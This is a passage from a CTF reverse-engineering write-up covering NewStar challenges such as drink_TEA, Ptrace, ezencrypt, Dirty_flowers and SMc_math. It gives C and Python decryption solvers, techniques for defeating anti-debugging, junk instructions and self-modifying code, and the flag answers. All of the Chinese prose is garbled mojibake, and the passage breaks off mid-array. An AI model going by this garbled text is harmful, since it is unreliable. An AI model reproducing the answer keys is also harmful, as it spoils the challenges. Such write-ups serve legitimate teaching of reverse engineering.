å¯†ï¼Œdataæ˜¯å¯†æ–‡ï¼ŒRC4æ˜¯ä¸ªå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œå…¶åŠ è§£å¯†è¿‡ç¨‹æ˜¯ä¸€æ ·çš„ï¼Œexpå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; void swap(char* a1,char* a2) { char temp; temp = *a1; *a1 = *a2; *a2 = temp; } void RC4_Decode(char* data, unsigned char* sbox) { unsigned char a = 0; unsigned char b = 0; int length = 22; for (int i = 0; i \u0026lt; length; i++) { b += sbox[++a]; swap((char*)\u0026amp;sbox[a], (char*)\u0026amp;sbox[b]); data[i] ^= sbox[(sbox[a] + sbox[b])%256]; } for (int i = 0; i \u0026lt; length; i++) { printf(\u0026#34;%c\u0026#34;, data[i]); } } unsigned char* Initial_sbox(char* key) { unsigned char sbox[256] = { 0 }; for (int i = 0; i \u0026lt; 256; i++) { sbox[i] = i; } int length = strlen(key); unsigned char kbox[256] = { 0 }; for (int i = 0; i \u0026lt; 256; i++) { kbox[i] = key[i % length]; } int j = 0; for (int i = 0; i \u0026lt; 256; i++) { j = (j + sbox[i] + kbox[i]) % 256; swap((char*) \u0026amp; sbox[i], (char*) \u0026amp; sbox[j]); } return sbox; } int main() { char data[23] = { -60,96,-81,-71,-29,-1,46,-101,-11,16,86,81,110,-18,95,125,125,110,43,-100,117,-75,\u0026#39;\\0\u0026#39;}; char key[] = \u0026#34;NewStar\u0026#34;; unsigned char* sbox = (unsigned char*)malloc(sizeof(char) * 256); sbox = Initial_sbox(key); RC4_Decode(data, sbox); return 0; } å¾—åˆ°ç­”æ¡ˆflag{Do_you_know_UPX?}\ndrink_TEA mainå‡½æ•°å†…å®¹å¦‚å›¾ï¼Œå·²ç»ç»è¿‡äº†ä¸€äº›ä¿®æ”¹ã€‚ç”±memcmpå‡½æ•°å¯ä»¥åˆ¤æ–­å‡ºEncodeAnsweræ˜¯åŠ å¯†è¿‡åçš„å¯†æ–‡ï¼Œç”±TEAåŠ å¯†ç®—æ³•çš„ç‰¹å¾å¯ä»¥åˆ¤æ–­å‡ºaWelcometonewstæ˜¯ä¸€ä¸ªç±»ä¼¼äºå¯†é’¥çš„å­—ç¬¦ä¸²ï¼Œforå¾ªç¯æ¯æ¬¡å–inputçš„å…«ä¸ªå­—èŠ‚ä¼ å…¥TEAåŠ å¯†å‡½æ•°ï¼Œåœ¨TEAå‡½æ•°é‡Œåˆ†æˆä¸¤ä¸ªå››å­—èŠ‚è¿›è¡ŒåŠ å¯†ã€‚åœ¨è¿™é‡Œä¸å¤šèµ˜è¿°TEAç®—æ³•çš„ç»†èŠ‚ï¼Œå¯†æ–‡åœ¨EncodeAnsweré‡Œé¢æ‰¾åˆ°ï¼ŒTEAåŠ å¯†çš„å…·ä½“å†…å®¹å¦‚ä¸‹å›¾\nè§£å¯†å‡ºæ¥çš„ç»“æœæ˜¯åå…­è¿›åˆ¶æ•°ï¼Œéœ€è¦è½¬æ¢æˆå¯è¯»çš„å­—ç¬¦ä¸²\nè¿™é‡Œæœ‰ä¸ªå¤§å°ç«¯åºçš„é—®é¢˜ï¼Œå…¶å®è¿™é‡Œä¼ å…¥è§£å¯†å‡½æ•°çš„æ–¹å¼ä¸æ˜¯å¾ˆå¯¹ï¼Œæ­£å¸¸æ˜¯å¯ä»¥å¾—åˆ°æŒ‰é¡ºåºçš„flagçš„ï¼Œä¸‹é¢ç»™å‡ºexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include\u0026lt;stdio.h\u0026gt; void Decode(unsigned int* a1, unsigned int* a2 ,unsigned int* key, unsigned int Delta) { unsigned int sum = -32*Delta; for (int i = 0; i \u0026lt; 32; ++i) { *a2 -= (key[3] + ((*a1) \u0026gt;\u0026gt; 5)) ^ (sum + (*a1)) ^ (key[2] + ((*a1) \u0026lt;\u0026lt; 4)); *a1 -= (key[1] + ((*a2) \u0026gt;\u0026gt; 5)) ^ (sum + (*a2)) ^ (key[0] + ((*a2) \u0026lt;\u0026lt; 4)); sum += Delta; } } int main() { unsigned int Delta = 0x61C88647; unsigned int input[8]; unsigned int sum = 0; input[0] = 0xB3F72078; input[1] = 0xDACE42C5; input[2] = 0x1A215985; input[3] = 0x595A5626; input[4] = 0xED0D0229; input[5] = 0xEEB9A807; input[6] = 0x87115936; input[7] = 0x24235CFD; char key[17] = \u0026#34;WelcomeToNewStar\u0026#34;; for (int i = 0; i \u0026lt; 8 ; i+=2) { Decode(\u0026amp;input[i], \u0026amp;input[i+1], (unsigned int*)key, Delta); } for (int i = 0; i \u0026lt; 8; i++) { printf(\u0026#34;%x\u0026#34;, input[i]); } return 0; } å¾—åˆ°flagçš„16è¿›åˆ¶å½¢å¼ï¼š67616c666568547b525f65724145545f4554585f6e615f4158585f647d414554\nPtrace é¢˜ç›®ç»™äº†ä¸¤ä¸ªelfæ–‡ä»¶ï¼ŒPIEæŸ¥äº†æ— å£³\nè¿™æ˜¯è¿™æ˜¯fatheræ–‡ä»¶åç¼–è¯‘åçš„å†…å®¹ï¼Œå‡ºç°äº†ä¸€äº›æ²¡è§è¿‡çš„å‡½æ•°ç»è¿‡æŸ¥è¯¢å¯çŸ¥\næ‰€ä»¥å¯ä»¥çŸ¥é“ptraceå‡½æ•°å¾€å­è¿›ç¨‹çš„addrå†…å­˜åœ°å€å†™å…¥äº†ä¸€ä¸ªæ•´æ•°3,æŸ¥çœ‹IDAå¯ä»¥çœ‹åˆ°addrä»£è¡¨åœ°å€0x60004040\næ‰“å¼€å­è¿›ç¨‹å¯ä»¥çœ‹åˆ°æ—¶è¿›è¡Œäº†ä¸€ä¸ªç®€å•çš„åŠ å¯†æ“ä½œï¼Œä¸éš¾çœ‹å‡ºbyte_60004020æ˜¯å¯†æ–‡æ•°ç»„ï¼Œç°åœ¨æœªçŸ¥çš„åªæœ‰\nnum_4è¿™ä¸ªå˜é‡ï¼Œå…¶å®è¿™ä¸ªnum_4å°±æ˜¯å‰é¢addrçš„åœ°å€ï¼Œæ‰€ä»¥ä»–çš„å€¼æ˜¯3,æ¥ä¸‹æ¥åªè¦å†™expå°±è¡Œäº†\n1 2 3 4 5 6 7 8 9 10 11 12 #include\u0026lt;stdio.h\u0026gt; int main() { int input[32] = { 204,141,44,236,111,136,237,235,47,237,174,235,78,172,44,141,141,47,235,109,205,237,238,235,14,142,78,44,108,172,231,175 }; for (int i = 0; i \u0026lt; 32; i++) { input[i] = (input[i] \u0026lt;\u0026lt; 3) | (input[i] \u0026gt;\u0026gt; 5); printf(\u0026#34;%c\u0026#34;, input[i]); } return 0; } flag{Do_you_really_know_ptrace?}\nezencrypt jadxæ‰“å¼€ï¼Œè¿›å…¥mainactivityï¼Œæœ‰ç”¨çš„ä¿¡æ¯åªæœ‰å¼€å¤´çš„keyæ•°ç»„ï¼Œè¿˜æœ‰æœ€ä¸‹é¢è¯»å–äº†æˆ‘ä»¬çš„è¾“å…¥å¹¶è¿›è¡Œäº†åˆ¤æ–­\nencæ˜¯ä½œè€…å®ç°çš„ä¸€ä¸ªç±»ï¼Œä¼°è®¡å°±æ˜¯åŠ å¯†å‡½æ•°äº†ï¼Œcheckæ˜¯encç±»ä¸‹çš„ä¸€ä¸ªå‡½æ•°\nç‚¹è¿›æ¥èƒ½çœ‹åˆ°encç±»çš„å…·ä½“å®ç°ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªæ˜¯æ€»åŠ å¯†å‡½æ•°ï¼Œç¬¬äºŒä¸ªcheckå‡½æ•°å®é™…ä¸Šæ˜¯è°ƒç”¨çš„nativeæ–¹æ³•ä¸­çš„ä¸€ä¸ªsoæ–‡ä»¶å®ç°çš„ï¼Œå…·ä½“å†…å®¹éœ€è¦å°†apkè§£å‹ä¹‹åç”¨IDAæ‰“å¼€soæ–‡ä»¶è¿›è¡Œåˆ†æã€‚ç¬¬ä¸‰ä¸ªå‡½æ•°stringtokeyæ˜¯å¯¹æˆ‘ä»¬å‰é¢æ‰¾åˆ°çš„keyå¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œç”¨çš„æ˜¯AESçš„åŠ å¯†ç®—æ³•ã€‚encryptå‡½æ•°æ˜¯å¯¹æˆ‘ä»¬è¾“å…¥çš„åŠ å¯†å‡½æ•°ï¼Œç”¨çš„AESåŠ å¯†ï¼ŒECBæ¨¡å¼ï¼ŒPKCS5Paddingæ¨¡å¼ã€‚ä¸‹é¢çš„decryptå‡½æ•°åˆ™æ˜¯è§£å¯†å‡½æ•°ï¼Œæœ€åå£°æ˜äº†ezencrypt.soæ–‡ä»¶ã€‚\nåœ¨IDAé‡Œæˆ‘ä»¬èƒ½çœ‹åˆ°doEncCheckå‡½æ•°çš„å…·ä½“å®ç°ï¼ŒJavaé€šè¿‡JNIä¼ é€’æˆ‘ä»¬çš„è¾“å…¥åˆ°cè¯­è¨€çš„å‡½æ•°ä¸­ï¼Œä¸éš¾çœ‹å‡ºmmæ•°ç»„æ˜¯æœ€ç»ˆåŠ å¯†å®Œæˆçš„å¯†æ–‡ï¼Œä¸‹é¢ç‚¹è¿›encå‡½æ•°è¿›è¡ŒæŸ¥çœ‹ä»–å¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œäº†ä»€ä¹ˆæ“ä½œ\nç‚¹è¿›æ¥çœ‹åˆ°å®ƒæ˜¾ç¤ºå¯¹æˆ‘ä»¬çš„è¾“å…¥å’Œkeyæ•°ç»„è¿›è¡Œäº†å¼‚æˆ–æ“ä½œï¼Œæ¥ç€å†å¯¹inputå’Œkeyæ•°ç»„é€šè¿‡rc4ç®—æ³•è¿›è¡ŒåŠ å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›¸åº”çš„è§£å¯†è¿‡ç¨‹å°±æ˜¯å…ˆrc4è§£å¯†åœ¨å’Œkeyæ•°ç»„å¼‚æˆ–å°±èƒ½å¾—åˆ°æ˜æ–‡ï¼Œä¸‹é¢ç»™å‡ºkeyæ•°ç»„å’Œmmæ•°ç»„çš„å…·ä½“å†…å®¹\nexpå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; void swap(char* a1, char* a2) { char temp; temp = *a1; *a1 = *a2; *a2 = temp; } void RC4_Decode(char* data, unsigned char* sbox) { unsigned char a = 0; unsigned char b = 0; int length = 44; for (int i = 0; i \u0026lt; 44; i++) { b += sbox[++a]; swap((char*)\u0026amp;sbox[a], (char*)\u0026amp;sbox[b]); data[i] ^= sbox[(sbox[a] + sbox[b]) % 256]; } } unsigned char* Initial_sbox(char* key) { unsigned char sbox[256] = { 0 }; for (int i = 0; i \u0026lt; 256; i++) { sbox[i] = i; } int length = strlen(key); unsigned char kbox[256] = { 0 }; for (int i = 0; i \u0026lt; 256; i++) { kbox[i] = key[i % length]; } int j = 0; for (int i = 0; i \u0026lt; 256; i++) { j = (j + sbox[i] + kbox[i]) % 256; swap((char*)\u0026amp;sbox[i], (char*)\u0026amp;sbox[j]); } return sbox; } int main() { char data[45] = { 194,108,115,244,58,69,14,186,71,129,42,38,246,121,96,120,179,100,109,220,201,4,50,59,159,50,149,96,238,130,151,231,202,61,170,149,118,197,155,29,137,219,152,93,\u0026#39;\\0\u0026#39;}; char key[] = \u0026#34;meow\u0026#34;; unsigned char* sbox = (unsigned char*)malloc(sizeof(char) * 256); sbox = Initial_sbox(key); RC4_Decode(data, sbox); for (int i = 0; i \u0026lt; 44; i++) { data[i] ^= key[i % strlen(key)]; } for (int i = 0; i \u0026lt; 44; i++) { printf(\u0026#34;%c\u0026#34;, data[i]); } printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;ä»¥ä¸Šç»“æœä¸ºAESåŠ å¯†åè½¬base64ç¼–ç çš„ç»“æœ\\n\u0026#34;); printf(\u0026#34;å‰©ä½™ç»“æœè¯·ä½¿ç”¨åœ¨çº¿å·¥å…·AESè§£å¯†ï¼Œé€‰æ‹©ECBæ¨¡å¼ï¼Œpkcs7å¡«å……ï¼Œå¯†é’¥ä¸º\\\u0026#34;IamEzEncryptGame\\\u0026#34;\u0026#34;); return 0; } soå±‚è§£å¯†ç»“æœï¼š2BB+GQampKmsrfDG85+0A7n18M+kT2zBDiZSO28Ich4=\nè¿™æ˜¯soå±‚é¢çš„è§£å¯†è¿‡ç¨‹ï¼Œåˆ«å¿˜äº†è¿˜æœ‰Javaå±‚çš„åŠ å¯†ï¼Œç”±äºå¯¹Javaè¯­è¨€è¿˜æ²¡é‚£ä¹ˆç†Ÿæ‚‰ï¼Œæ— æ³•æ‰‹æ“è§£å¯†ä»£ç ï¼Œæ‰€ä»¥å€Ÿç”¨ä¸€ä¸‹åœ¨çº¿ç½‘ç«™çš„è§£å¯†å·¥å…·ï¼Œæ ¹æ®ç›¸åº”çš„æ¨¡å¼å¯ä»¥å¾—åˆ°flag{Ohh_U_knOw_7h15_5ki11}\nPangBai æ³°æ‹‰è®°ï¼ˆ1ï¼‰ IDAæ‰“å¼€ä¹‹åçœ‹åˆ°è¿™æ ·çš„ç•Œé¢ï¼Œæœ€æ˜¾çœ¼çš„å°±æ˜¯ç²‰è‰²çš„isdebuggerpresentå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥æ£€æµ‹å½“å‰ç¨‹åºæ˜¯å¦åœ¨è¢«è°ƒè¯•ï¼Œå¦‚æœè°ƒè¯•åˆ™å€¼ä¸º1åä¹‹ä¸º0ï¼Œé˜…è¯»ç¨‹åºé€»è¾‘å¯ä»¥å‘ç°ç¨‹åºæœ‰ä¸¤æ®µåŠ å¯†è¿‡ç¨‹ï¼Œç»è¿‡å°è¯•ç¬¬ä¸€æ®µåŠ å¯†è¿‡ç¨‹å¾—åˆ°çš„ä¸æ˜¯æ­£ç¡®çš„flagï¼Œé‚£ä¹ˆå°±å°è¯•å¯¹ç¬¬äºŒæ®µåŠ å¯†è¿‡ç¨‹è¿›è¡Œè§£å¯†\nkeyæ•°ç»„çš„å†…å®¹æ˜¯è¿™æ ·çš„\nç›´æ¥ç¼–å†™è§£å¯†ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; int main() { char temp[23] = \u0026#34;nhvviguMI?u\\\u0026#34;,o/fWivoM;\u0026#34;; temp[22] = 127; char temp1[] = \u0026#34;Homy2.l#{\u0026#34;; char flag[] = \u0026#34;can you find me can you find me?\u0026#34;; char key[] = \u0026#34;key1key2key3key4key6key7key8key9\u0026#34;; for (int i = 0; i \u0026lt; 32; i++) { if (i \u0026lt; 23) key[i] ^= temp[i]; else key[i] ^= temp1[i - 23]; } for (int i = 0; i \u0026lt; 32; i++) { flag[i] ^= key[i]; printf(\u0026#34;%c\u0026#34;, flag[i]); } return 0; } flag{my_D3bugg3r_may_1s_banned?}\nDirty_flowers æ‰“å¼€IDAæ˜¯è¿™æ ·çš„ï¼Œç”±é¢˜ç›®çš„åå­—å¯ä»¥çŒœæµ‹ä»£ç è¢«èŠ±æŒ‡ä»¤å¹²æ‰°è¿‡äº†ï¼Œæ ¹æ®æç¤ºæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æ±‡ç¼–ä»£ç ä¸­çš„ç›¸åº”çš„retnæŒ‡ä»¤å’Œcall $ + 5æŒ‡ä»¤\nç”±äºä¸å¤ªä¼šç”¨IDAçš„é‡å®šä¹‰ï¼Œæ‰€ä»¥é€‰æ‹©æ‰“å¼€xdbgæ¥nopæ‰è¿™äº›èŠ±æŒ‡ä»¤å†æ‰“è¡¥ä¸\næ‰¾åˆ°ç›¸åº”èŠ±æŒ‡ä»¤çš„ä½ç½®ï¼Œnopæ‰\nç„¶åå¾—åˆ°æˆ‘ä»¬ä¿®è¡¥è¿‡åçš„mainå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å°±ä¸€ä¸ªåŠ å¯†è¿‡ç¨‹\nexpå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; int main() { char encrypted[36]; encrypted[0] = 2; encrypted[1] = 5; encrypted[2] = 19; encrypted[3] = 19; encrypted[4] = 2; encrypted[5] = 30; encrypted[6] = 83; encrypted[7] = 31; encrypted[8] = 92; encrypted[9] = 26; encrypted[10] = 39; encrypted[11] = 67; encrypted[12] = 29; encrypted[13] = 54; encrypted[14] = 67; encrypted[15] = 7; encrypted[16] = 38; encrypted[17] = 45; encrypted[18] = 85; encrypted[19] = 13; encrypted[20] = 3; encrypted[21] = 27; encrypted[22] = 28; encrypted[23] = 45; encrypted[24] = 2; encrypted[25] = 28; encrypted[26] = 28; encrypted[27] = 48; encrypted[28] = 56; encrypted[29] = 50; encrypted[30] = 85; encrypted[31] = 2; encrypted[32] = 27; encrypted[33] = 22; encrypted[34] = 84; encrypted[35] = 15; char key[] = \u0026#34;dirty_flower\u0026#34;; int length = strlen(key); for (int i = 0; i \u0026lt; 36; i++) { encrypted[i] ^= key[i % length]; printf(\u0026#34;%c\u0026#34;, encrypted[i]); } return 0; } flag{A5s3mB1y_1s_r3ally_funDAm3nta1}\nWeek 3 SMc_math è¿›æ¥å¯¹mainå‡½æ•°f5åç¼–è¯‘ä¸€ä¸‹ï¼Œå‘ç°äº†æœ‰ä¸ªå¾ªç¯å¯¹å‡½æ•°encryptçš„åœ°å€å’Œ0x3Eä½ä¸ï¼Œå¹¶ä¸”è°ƒç”¨äº†mprotectå‡½æ•°ï¼ŒæŸ¥èµ„æ–™äº†è§£åˆ°è¿™å¯èƒ½è¿›è¡Œäº†smcæ··æ·†ï¼Œå¹¶ä¸”ç›´æ¥ç‚¹è¿›enpcryptå‡½æ•°ä¼šçˆ†çº¢\næ›´å…·ç‰¹å¾çš„å°±æ˜¯è¿™ä¸€å¤§æ®µçš„æ•°æ®å—æ— æ³•è¢«è¯»å–ï¼Œåœ¨ç½‘ä¸Šå­¦ä¹ åˆ«çš„å¤§ä½¬å¦‚ä½•è§£smcæ··æ·†åï¼Œè‡ªå·±å†™äº†ä¸ªidcè„šæœ¬\nè¿è¡Œä¹‹åencryptå‡½æ•°çš„æ±‡ç¼–ä»£ç å°±å‡ºæ¥äº†ï¼Œæ¥ä¸‹æ¥åªè¦æŒ‰Ué‡å®šä¹‰ä¸€ä¸‹å†æŒ‰Cè½¬æ¢ä¸ºä»£ç ï¼Œæœ€ååœ¨å‡½æ•°å¤´çš„ä½ç½®æŒ‰På°±èƒ½å¾—åˆ°åˆ°è§£æ··æ·†åçš„encryptå‡½æ•°å¦‚ä¸‹\nè¿™æ˜¯ä¸€ä¸ª7å…ƒéçº¿æ€§æ–¹ç¨‹ç»„ï¼Œè¦è§£çš„è¯éœ€è¦ç”¨åˆ°z3çº¦æŸæ±‚è§£å™¨ï¼Œç”±äºæ²¡å­¦è¿‡z3åªèƒ½å¯»æ±‚aiçš„å¸®åŠ©ï¼Œä»¥ä¸‹æ˜¯exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from z3 import * # åˆ›å»ºZ3æ±‚è§£å™¨ solver = Solver() # å£°æ˜å˜é‡v2åˆ°v8 v2 = BitVec(\u0026#39;v2\u0026#39;, 64) v3 = BitVec(\u0026#39;v3\u0026#39;, 64) v4 = BitVec(\u0026#39;v4\u0026#39;, 64) v5 = BitVec(\u0026#39;v5\u0026#39;, 64) v6 = BitVec(\u0026#39;v6\u0026#39;, 64) v7 = BitVec(\u0026#39;v7\u0026#39;, 64) v8 = BitVec(\u0026#39;v8\u0026#39;, 64) # æ·»åŠ æ–¹ç¨‹çº¦æŸ solver.add(5 * (v3 + v2) + 4 * v4 + 6 * v5 + v6 + 9 * v8 + 2 * v7 == 0xD5CC7D4FF) solver.add(4 * v8 + 3 * v5 + 6 * v4 + 10 * v3 + 9 * v2 + 9 * v7 + 3 * v6 == 0x102335844B) solver.add(9 * v6 + 4 * (v5 + v4) + 5 * v3 + 4 * v2 + 3 * v8 + 10 * v7 == 0xD55AEABB9) solver.add(9 * v3 + 5 * v2 + 9 * v8 + 2 * (v4 + 2 * v5 + 5 * v6 + v7) == 0xF89F6B7FA) solver.add(5 * v6 + 9 * v5 + 7 * v2 + 2 * v3 + v4 + 3 * v8 + 9 * v7 == 0xD5230B80B) solver.add(8 * v8 + 6 * v5 + 10 * v4 + 5 * v3 + 6 * v2 + 3 * v7 + 9 * v6 == 0x11E28ED873) solver.add(v2 + 4 * (v4 + v3 + 2 * v5) + 9 * v6 + v7 + 3 * v8 == 0xB353C03E1) # æ£€æŸ¥æ˜¯å¦æœ‰è§£ if solver.check() == sat: model = solver.model() # æå–å˜é‡çš„è§£ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸º16è¿›åˆ¶æ•°è¾“å‡º result = [model[v2].as_long(), model[v3].as_long(), model[v4].as_long(), model[v5].as_long(), model[v6].as_long(), model[v7].as_long(), model[v8].as_long()] # å°†è§£è½¬æ¢ä¸º16è¿›åˆ¶æ•°å¹¶è¾“å‡º print([hex(r) for r in result]) else: print(\u0026#34;No solution found\u0026#34;) flag{D0_Y0u_Kn0w_sMC_4nD_Z3}\nå–å•¥åå¥½å‘¢ï¼Ÿ IDAæ‰“å¼€å‘ç°æ— æ³•f5åç¼–è¯‘ï¼Œæ˜¯è¢«åŠ èŠ±è¿‡çš„\nå®šä½åˆ°èŠ±æŒ‡ä»¤çš„ä½ç½®ï¼Œçœ‹æ“ä½œç åŸæ¥åº”è¯¥æ˜¯EB 2Cè·³è½¬åˆ°æŸä¸ªåœ°æ–¹ï¼Œæ‰€ä»¥æŠŠè¿™ä¸¤ä¸ªæ“ä½œç æ”¾åˆ°ä¸€èµ·å³å¯\nä¿®æ”¹åè¿›åˆ°mainå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°åŸºæœ¬é€»è¾‘æ˜¯é€šè¿‡setjmpå‡½æ•°çš„è¿”å›å€¼æ¥é€‰æ‹©æ‰§è¡Œå“ªæ¡è¯­å¥\nè¿™é‡Œè´´å‡ºå¯¹åº”ä¿¡å·å‘ç”Ÿçš„è¿”å›å€¼\nå·¦è¾¹çš„å‡½æ•°åˆ—è¡¨è¿˜æœ‰ä¸ªmianå‡½æ•°ï¼Œé‡Œé¢å®šä¹‰äº†å‡ ä¸ªsignalå‡½æ•°ç”¨æ¥å¤„ç†ç¨‹åºè¿è¡Œæ—¶å‡ºç°é”™è¯¯çš„å¤„ç†å‡½æ•°ï¼ŒåŸºæœ¬çœ‹åˆ°è¿™é‡Œå°±æ— æ³•é™æ€åˆ†æäº†ï¼Œæ‰€ä»¥è€ƒè™‘ç”¨dbgæ¥åŠ¨æ€åˆ†æï¼Œç”±äºæ˜¯elfæ–‡ä»¶ï¼Œæ‰€ä»¥ç”¨è™šæ‹Ÿæœºè¿œç¨‹è°ƒè¯•ã€‚\nä»¥ä¸‹æ˜¯è°ƒè¯•ç»“æœï¼Œå¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°ç¨‹åºè°ƒç”¨å‡½æ•°çš„é¡ºåºï¼Œåé¢ä¼šæ‰§è¡Œ23æ¬¡handle_func1å°±ä¸æˆªå›¾äº†ã€‚\né€šè¿‡è°ƒè¯•ï¼‹åˆ†æå¯ä»¥å¾—å‡ºç¨‹åºè¿è¡Œçš„é¡ºåºï¼šå…ˆè¿è¡Œå‘ç”ŸæŠ¥é”™SIGSEGVï¼Œæ¥ç€è¿è¡Œhandle_func2\næŠŠdword_4068çš„åœ°å€èµ‹å€¼ç»™qword_4060å†åœ¨mainå‡½æ•°ä¸­ç»™qword_4060èµ‹å€¼233ï¼Œå…¶å®å°±æ˜¯ç»™dword_4068èµ‹å€¼233ï¼Œç„¶åè§¦å‘äº†SIGILLä¿¡å·ï¼Œæ˜¯å‰é¢çš„èŠ±æŒ‡ä»¤å¯¼è‡´çš„ä¿¡å·ï¼Œè°ƒç”¨äº†handlerå‡½æ•°ï¼Œä½¿mainå‡½æ•°çš„Switchæ§åˆ¶æµè·³è½¬åˆ°case1\næ¥ç€è§¦å‘äº†SIGFPEï¼Œå…¶ä¿¡å·è§¦å‘çš„æ ¹æºåœ¨mainå‡½æ•°çš„æ±‡ç¼–ä»£ç ä¸­\nè¯·çœ‹è¿™æ®µæ±‡ç¼–ä»£ç ï¼Œå…ˆç”¨moveæŒ‡ä»¤æŠŠecxå¯„å­˜å™¨çš„å€¼æ”¹ä¸º0ï¼Œç„¶åå†é™¤ä»¥ecxçš„å€¼ï¼Œä¸€ä¸ªé™¤æ³•è¿ç®—çš„é™¤æ•°ä¸å¯ä»¥æ˜¯0ï¼Œè€Œè¿™å´æ˜¯0ï¼Œæ‰€ä»¥è§¦å‘äº†SIGFPEï¼ˆæµ®ç‚¹å¼‚å¸¸ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥æ³¨æ„åˆ°æ˜¯åœ¨printfå‰é¢ï¼Œè¯´æ˜mainå‡½æ•°æœ€ä¸‹é¢é‚£æ®µforå¾ªç¯æ˜¯å¯ä»¥æ‰§è¡Œåˆ°çš„ï¼Œç”±äºmainå‡½æ•°æ¯æ¬¡è¿è¡Œåˆ°è¿™é‡Œéƒ½ä¼šè§¦å‘SIGFPEä¿¡å·ï¼Œæ‰€ä»¥ä¼šä¸€ç›´è°ƒç”¨handle_func1å‡½æ•°ç›´åˆ°dword_4168=22\nä¸éš¾ç†è§£å°±æ˜¯æ‰§è¡Œ22æ¬¡input[i] ^= i,sub_12E9å‡½æ•°æ˜¯å¯¹æˆ‘ä»¬çš„è¾“å…¥å’Œå¯†æ–‡è¿›è¡Œæ¯”è¾ƒ\né€»è¾‘åˆ†æåˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œä¸‹é¢è´´å‡ºexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include\u0026lt;stdio.h\u0026gt; int main() { char input[] = { 79,84,72,83,96,69,55,26,40,65,38,22,59,69,20,71,14,12,112,59,60,61,112,\u0026#39;\\0\u0026#39;}; for (int i = 0; i \u0026lt;23; i++) { input[i] ^= i; } for (int i = 0; i \u0026lt; 23; i++) { input[i] -= 233; } for (int i = 0; i \u0026lt; 23; i++) { printf(\u0026#34;%c\u0026#34;, input[i]); } return 0; } flag{WH47_C4N_1_54y???}\nsimpleAndroid jadxæ‰“å¼€æ‰¾åˆ°mainactivityï¼Œæœ‰å‡ ä¸ªå…³é”®ä¿¡æ¯ï¼š1.è°ƒç”¨äº†simpleandroidè¿™ä¸ªsoæ–‡ä»¶ï¼Œå¹¶ä¸”è°ƒç”¨äº†nativeæ–¹æ³•showDataã€‚2.è°ƒç”¨äº†Checkactivityæ–¹æ³•é‡Œé¢çš„checkDataå‡½æ•°ï¼Œç”¨æ¥åˆ¤æ–­ç”¨æˆ·çš„è¾“å…¥ã€‚3.å…ˆå¯¹ç”¨æˆ·çš„è¾“å…¥è°ƒç”¨nativeæ–¹æ³•å†è°ƒç”¨checkå‡½æ•°éªŒè¯\nç‚¹è¿›checkactivityç±»ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†checkdataå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œåˆ¤æ–­ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥IDAæ‰“å¼€soæ–‡ä»¶çœ‹checkdataå‡½æ•°çš„é€»è¾‘ã€‚\næ‰¾åˆ°checkdataå‡½æ•°ï¼Œæ³¨æ„ä¸Šé¢å‡ ä¸ªJNIenvçš„å‡½æ•°ï¼Œæ˜¯è°ƒç”¨äº†com/example/simpleandroid/UseLessè·¯å¾„ä¸‹çš„uselessç±»ï¼Œå¹¶ä¸”è¿›è¡Œäº†ä¸€ä¸ªbase64çš„æ¢è¡¨ï¼Œç»è¿‡ä»”ç»†çš„åˆ†æå’Œæ”¹åæ”¹ç±»å‹èƒ½å¾—åˆ°ä¸‹é¢çš„ä»£ç \næ•´ä¸ªåŠ å¯†è¿‡ç¨‹çš„é€»è¾‘å°±æ˜¯å…ˆæŠŠè¾“å…¥çš„æ•°æ®ä»¥ä¸­é—´ä¸ºå¯¹ç§°è½´å‰åäº¤æ¢ï¼Œæ¥ç€å†å¯¹æ¯ä¸ªæ•°æ®è¿›è¡Œç§»ä½å’Œä½è¿ç®—ï¼Œæœ€åå¾—åˆ°å¯†æ–‡data_1è§£å¯†é€»è¾‘å¾ˆç®€å•ç›´æ¥ç»™å‡ºexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; int main() { unsigned char input[] = { 